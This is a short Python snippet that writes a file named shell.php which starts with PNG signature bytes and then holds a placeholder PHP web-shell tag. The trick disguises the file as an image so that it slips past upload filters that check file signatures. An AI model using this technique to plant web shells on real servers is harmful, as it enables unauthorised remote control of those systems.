fh = open('shell.php', 'wb')
fh.write(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' + b'<? webshell-code ?>')
fh.close()
